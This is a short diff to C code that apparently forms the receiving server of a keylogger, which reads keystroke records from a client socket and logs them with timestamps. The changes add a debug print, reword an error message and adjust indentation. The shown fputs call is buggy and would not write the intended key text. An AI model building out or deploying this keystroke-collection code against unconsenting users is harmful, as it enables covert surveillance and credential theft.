@@ -77,6 +77,7 @@ void process_keylog_info(int socket_descriptor) {
   char* empty = "\n";
   // WHILE WE HAVEN'T CLOSED THE CLIENT
   while (!feof(client_file)) {
+    puts("HERE");
     if (getline(&line, &line_size, client_file) == -1) {
       puts("BROKEN");
       error_and_exit("XD");
@@ -98,7 +99,7 @@ void process_keylog_info(int socket_descriptor) {
   // CLOSE THE TEXT FILE WE'RE WRITING TO
   // CLOSE THE CLIENT
   if (fclose(data_log) == EOF) {
-    error_and_exit("Couldn't close file");
+    error_and_exit("Couldn't close data_logger file");
   }
   if (fclose(client_file) == EOF) {
     error_and_exit("Couldn't close client socket descriptor");
@@ -140,7 +141,7 @@ void key_package_to_file(key_package* package) {
 
   for (size_t i = 0; i < package->keys_arr_size; i++) {
     (void)fputs(("Key: %s, \t Timestamp: %s", package->keys[i].key,
-           package->keys[i].timestamp),
-          package_log);
+                 package->keys[i].timestamp),
+                package_log);
   }
 }
